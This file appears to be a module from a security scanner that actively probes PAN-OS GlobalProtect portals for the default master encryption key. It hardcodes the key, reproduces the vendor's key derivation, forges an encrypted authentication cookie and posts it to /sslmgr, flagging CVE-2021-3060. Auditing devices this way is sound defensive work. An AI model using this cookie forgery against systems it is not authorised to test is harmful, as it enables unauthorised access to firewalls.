import re
import time
import hashlib
import base64
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from badsecrets.base import BadsecretsActiveBase

log = logging.getLogger(__name__)


class GlobalProtect_DefaultMasterKey(BadsecretsActiveBase):
    # YARA prefilter: fire when HTTP response looks like a GlobalProtect portal
    yara_prefilter_rule = (
        "rule GlobalProtect_DefaultMasterKey_prefilter {"
        " strings:"
        '  $gp1 = "GlobalProtect" nocase'
        '  $gp2 = "global-protect" nocase'
        '  $gp3 = "/sslmgr" nocase'
        '  $gp4 = "PanOS" nocase'
        '  $gp5 = "Pan-OS" nocase'
        '  $gp6 = "/global-protect/login.esp" nocase'
        " condition: any of them"
        "}"
    )

    description = {
        "product": "PAN-OS GlobalProtect",
        "secret": "Master Encryption Key",
        "severity": "CRITICAL",
    }

    DEFAULT_KEY = "p1a2l3o4a5l6t7o8"
    SALT = hashlib.md5(b"pannetwork").digest()

    @classmethod
    def derive_aes_key(cls, passphrase):
        """PAN-OS key derivation: MD5(passphrase + salt), doubled to 32 bytes."""
        derived = hashlib.md5(passphrase.encode() + cls.SALT).digest()
        return derived + derived  # 16 -> 32 bytes for AES-256

    @classmethod
    def build_auth_cookie(cls, aes_key):
        """Build encrypted appauthcookie token in PAN-OS format."""
        expiry = str(int(time.time()) + 86400)
        plaintext = f"{expiry}:baddns-probe:baddns-hostid".encode()

        iv = b"\x00" * 16
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        sha1_hash = hashlib.sha1(ciphertext).digest()
        version = base64.b64encode(b"\x01").decode()  # "AQ=="
        token = f"{version}{base64.b64encode(sha1_hash).decode()}-{base64.b64encode(ciphertext).decode()}"
        return token

    async def probe(self, url, custom_keys=None, **kwargs):
        """POST crafted appauthcookie to /sslmgr, analyze response.

        Args:
            url: Target URL (base URL, path will be replaced with /sslmgr)
            custom_keys: List of additional keys to try
        """
        import httpx

        results = []
        # Build target URL: replace path with /sslmgr
        base = re.match(r"(https?://[^/]+)", url)
        if not base:
            return results
        sslmgr_url = f"{base.group(1)}/sslmgr"

        # Always try default key first, then built-in resource keys, then custom keys
        keys_to_try = [self.DEFAULT_KEY]
        try:
            for line in self.load_resources(["globalprotect_masterkeys.txt"]):
                key = line.strip()
                if key and key not in keys_to_try:
                    keys_to_try.append(key)
        except FileNotFoundError:
            pass
        if custom_keys:
            for key in custom_keys:
                if key not in keys_to_try:
                    keys_to_try.append(key)

        client = self.http_client
        should_close = False
        if client is None:
            client = httpx.AsyncClient(timeout=10, verify=False)
            should_close = True

        try:
            for key_str in keys_to_try:
                try:
                    aes_key = self.derive_aes_key(key_str)
                    cookie = self.build_auth_cookie(aes_key)
                    data = {
                        "scep-profile-name": "badsecrets",
                        "user-email": "probe@badsecrets.local",
                        "user": "badsecrets-probe",
                        "host-id": "badsecrets-hostid",
                        "appauthcookie": cookie,
                    }
                    response = await client.post(
                        sslmgr_url,
                        data=data,
                        headers={
                            "User-Agent": "PAN-GlobalProtect",
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                    )
                    text = response.text

                    if "Unable to find the configuration" in text:
                        is_default = key_str == self.DEFAULT_KEY
                        results.append(
                            {
                                "type": "SecretFound",
                                "product": sslmgr_url,
                                "secret": f"{'default' if is_default else key_str} master key ({key_str})",
                                "location": "active_probe",
                                "details": {
                                    "key": key_str,
                                    "is_default_key": is_default,
                                    "scep_configured": False,
                                    "response_indicator": "Unable to find the configuration",
                                },
                            }
                        )
                    elif "Unable to generate client certificate" in text:
                        is_default = key_str == self.DEFAULT_KEY
                        results.append(
                            {
                                "type": "SecretFound",
                                "product": sslmgr_url,
                                "secret": f"{'default' if is_default else key_str} master key ({key_str})",
                                "location": "active_probe",
                                "details": {
                                    "key": key_str,
                                    "is_default_key": is_default,
                                    "scep_configured": True,
                                    "cve": "CVE-2021-3060",
                                    "response_indicator": "Unable to generate client certificate",
                                },
                            }
                        )
                    elif "Invalid Cookie" in text:
                        log.debug(f"Key '{key_str}' rejected by {sslmgr_url}")
                    else:
                        log.debug(f"Unexpected response from {sslmgr_url}: {text[:200]}")
                except Exception as e:
                    log.debug(f"Error probing {sslmgr_url} with key '{key_str}': {e}")
        finally:
            if should_close:
                await client.aclose()

        return results
